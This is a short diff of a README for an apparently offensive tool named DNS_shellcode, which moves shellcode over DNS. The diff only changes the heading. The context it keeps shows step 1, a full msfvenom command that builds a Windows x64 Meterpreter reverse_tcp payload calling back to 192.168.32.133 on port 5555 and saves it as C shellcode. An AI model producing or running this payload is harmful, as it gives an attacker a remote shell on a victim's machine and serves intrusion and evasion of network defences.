@@ -1,5 +1,5 @@
 # DNS_shellcode
-DNS内网分离传输脚本
+DNS_shellcode分离传输脚本
 ## step.1
 - msfvenom --platform windows --arch x64 -p windows/x64/meterpreter/reverse_tcp lhost=192.168.32.133 lport=5555 -f c > /root/safe/payload.txt
 
